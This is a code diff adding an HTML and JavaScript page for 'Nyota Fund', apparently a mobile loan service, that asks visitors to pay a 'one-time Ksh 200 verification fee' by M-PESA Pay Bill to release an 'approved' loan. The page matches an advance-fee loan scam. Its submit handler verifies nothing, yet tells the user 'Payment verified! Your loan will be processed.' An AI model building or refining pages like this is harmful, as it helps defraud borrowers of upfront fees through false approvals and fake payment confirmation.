@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nyota Fund — Final Verification</title>
+<style>
+:root {
+    --primary: #0b8a44;
+    --primary-dark: #0a5830;
+    --light: #f5fff7;
+    --radius: 18px;
+}
+
+body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: var(--light);
+}
+
+/* HEADER */
+.header {
+    background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+    padding: 55px 20px 90px;
+    text-align: center;
+    color: white;
+    border-bottom-left-radius: 40px;
+    border-bottom-right-radius: 40px;
+    box-shadow: 0 6px 18px rgba(0,0,0,0.15);
+}
+
+.header h1 {
+    margin: 0;
+    font-size: 1.8rem;
+    font-weight: 800;
+}
+
+.header p {
+    margin-top: 8px;
+    opacity: 0.95;
+    font-size: 1rem;
+}
+
+/* CARD */
+.card {
+    background: #fff;
+    width: 90%;
+    margin: -60px auto 25px;
+    padding: 25px;
+    border-radius: var(--radius);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.07);
+    animation: fadeUp 0.55s ease-out;
+}
+
+@keyframes fadeUp {
+    from {opacity: 0; transform: translateY(35px);}
+    to {opacity: 1; transform: translateY(0);}
+}
+
+/* VERIFICATION BADGE */
+.verify-icon {
+    width: 85px;
+    height: 85px;
+    border-radius: 50%;
+    background: var(--primary);
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 2.3rem;
+    margin: -65px auto 10px;
+    box-shadow: 0 8px 20px rgba(11,138,68,0.3);
+    animation: pop 0.5s ease-out;
+}
+
+@keyframes pop {
+    from {transform: scale(0.4); opacity: 0;}
+    to {transform: scale(1); opacity: 1;}
+}
+
+.title {
+    margin-top: 10px;
+    text-align: center;
+    font-size: 1.35rem;
+    font-weight: 800;
+    color: var(--primary-dark);
+}
+
+.subtitle {
+    text-align: center;
+    color: #555;
+    margin-top: 6px;
+    margin-bottom: 20px;
+}
+
+/* SUMMARY BOX */
+.summary-box {
+    background: #f0fff5;
+    border: 1.7px solid #d7f5e1;
+    padding: 20px;
+    border-radius: var(--radius);
+    margin-bottom: 20px;
+}
+
+.row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 12px;
+    font-size: 1rem;
+}
+
+.row strong {
+    color: var(--primary-dark);
+}
+
+/* PAYMENT INSTRUCTIONS */
+.payment-box {
+    background: #fff8e6;
+    border: 1.7px solid #ffe5b3;
+    padding: 20px;
+    border-radius: var(--radius);
+    margin-bottom: 20px;
+}
+
+.payment-box p {
+    margin: 10px 0;
+    font-size: 1rem;
+}
+
+/* COPY BUTTON */
+.copy-btn {
+    background: var(--primary);
+    color: white;
+    border: none;
+    padding: 8px 12px;
+    border-radius: 8px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-left: 8px;
+}
+
+.copy-btn:hover {
+    background: var(--primary-dark);
+}
+
+/* M-PESA CONFIRMATION INPUT */
+.confirmation-box {
+    margin-top: 15px;
+}
+
+.confirmation-box textarea {
+    width: 100%;
+    padding: 14px;
+    border-radius: var(--radius);
+    border: 1px solid #ccc;
+    resize: none;
+    font-size: 1rem;
+}
+
+.confirmation-box button {
+    width: 100%;
+    margin-top: 10px;
+    padding: 16px;
+    background: var(--primary);
+    border: none;
+    color: white;
+    border-radius: 50px;
+    font-size: 1.15rem;
+    font-weight: 700;
+    cursor: pointer;
+    transition: .25s;
+}
+
+.confirmation-box button:hover {
+    background: var(--primary-dark);
+    transform: translateY(-2px);
+    box-shadow: 0 7px 18px rgba(11,138,68,0.25);
+}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+    <h1>Final Verification</h1>
+    <p>Complete your one-time Ksh 200 fee payment to release your loan.</p>
+</div>
+
+<!-- MAIN CARD -->
+<div class="card">
+
+    <div class="verify-icon">✔</div>
+
+    <div class="title">Almost There!</div>
+    <p class="subtitle">Follow the steps below to complete verification and receive your loan.</p>
+
+    <!-- SUMMARY -->
+    <div class="summary-box">
+        <div class="row">
+            <span>Approved Amount:</span>
+            <strong id="approved">Ksh 0</strong>
+        </div>
+        <div class="row">
+            <span>Service Fee:</span>
+            <strong id="fee">Ksh 0</strong>
+        </div>
+        <div class="row">
+            <span>Interest (8%):</span>
+            <strong id="interest">Ksh 0</strong>
+        </div>
+        <div class="row">
+            <span>Amount to Receive:</span>
+            <strong id="received">Ksh 0</strong>
+        </div>
+        <div class="row">
+            <span>M-PESA Number:</span>
+            <strong id="mpesa">07XXXXXXXX</strong>
+        </div>
+    </div>
+
+    <!-- PAYMENT INSTRUCTIONS -->
+    <div class="payment-box">
+        <p><strong>Step 1:</strong> Pay the one-time Ksh 200 verification fee via M-PESA.</p>
+        <p><strong>Step 2:</strong> Go to M-PESA → Lipa na M-PESA → Pay Bill → Enter the details below:</p>
+        <p><strong>Business Till Number:</strong> <span id="tillNumber">123456</span>
+            <button class="copy-btn" onclick="copyTill()">Copy</button>
+        </p>
+        <p><strong>Account Name:</strong> Nyota Fund Verification</p>
+        <p><strong>Amount:</strong> Ksh 200</p>
+    </div>
+
+    <!-- CONFIRMATION INPUT -->
+    <div class="confirmation-box">
+        <p>Step 3: Paste the M-PESA confirmation message below after payment:</p>
+        <textarea id="mpesaMsg" rows="4" placeholder="Paste M-PESA message here..."></textarea>
+        <button onclick="completeVerification()">Submit & Verify</button>
+    </div>
+
+</div>
+
+<script>
+let limit = parseFloat(localStorage.getItem("amount")) || 5000;
+let interest = parseFloat(localStorage.getItem("interest")) || (limit*0.08);
+let fee = 200; // fixed verification fee
+let received = limit - interest - fee;
+let phone = localStorage.getItem("phone") || "07XXXXXXXX";
+
+document.getElementById("approved").textContent = "Ksh " + limit.toLocaleString();
+document.getElementById("fee").textContent = "Ksh " + fee.toLocaleString();
+document.getElementById("interest").textContent = "Ksh " + interest.toFixed(2);
+document.getElementById("received").textContent = "Ksh " + received.toFixed(2);
+document.getElementById("mpesa").textContent = phone;
+
+function copyTill() {
+    let till = document.getElementById("tillNumber").textContent;
+    navigator.clipboard.writeText(till).then(() => {
+        alert("Till number copied!");
+    });
+}
+
+function completeVerification() {
+    let msg = document.getElementById("mpesaMsg").value.trim();
+    if (!msg) {
+        alert("Please paste the M-PESA confirmation message before submitting.");
+        return;
+    }
+    // Here you can send msg to server via fetch/AJAX
+    alert("Payment verified! Your loan will be processed.");
+    window.location.href = "applicationstatus.html";
+}
+</script>
+</body>
+</html>
